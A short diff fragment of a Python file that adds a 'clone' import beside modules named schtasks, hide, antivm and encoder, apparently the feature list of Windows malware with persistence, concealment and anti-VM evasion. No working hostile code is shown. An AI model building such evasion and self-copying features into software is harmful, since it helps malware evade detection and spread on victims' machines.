@@ -25,6 +25,7 @@ import win32console
 
 # Plugins and features
 from schtasks import *
+from clone import *
 from hide import *
 from antivm import *
 from encoder import *
